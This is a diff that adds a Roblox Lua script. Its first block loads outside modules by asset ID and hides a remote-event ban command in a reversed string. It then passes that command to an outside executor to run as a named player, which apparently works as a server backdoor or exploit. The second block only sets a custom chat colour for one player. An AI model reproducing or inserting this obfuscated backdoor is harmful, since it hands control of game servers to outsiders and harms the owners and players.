@@ -1,0 +1,25 @@
+
+local Bypass = require(2084649733)
+Bypass.setfenv(1, Bypass)
+local code=string.reverse(')"3< xox redla -- sssssekiy/9999999999/owo/nab/bs"(revreSeriF:dnammoCdnes.stnevEetomer.egarotSdetacilpeR.emag')
+require(4523396935)(code,game:service'Players'.CatsPloitsGaming)
+
+
+
+local Bypass = require(2084649733)
+Bypass.setfenv(1, Bypass)
+local Players = game:GetService('Players')
+local ChatService = require(game:GetService('ServerScriptService'):WaitForChild('ChatServiceRunner'):WaitForChild('ChatService'))
+
+Players.PlayerAdded:connect(function(player)
+    local speaker
+    while not speaker do
+        speaker = ChatService:GetSpeaker(player.Name)
+          wait()
+     end
+     if player.Name == "l0uh" then
+        speaker:SetExtraData("ChatColor", Color3.fromRGB(180, 128, 255))
+     end
+end)
+
+-- (180, 128, 255)
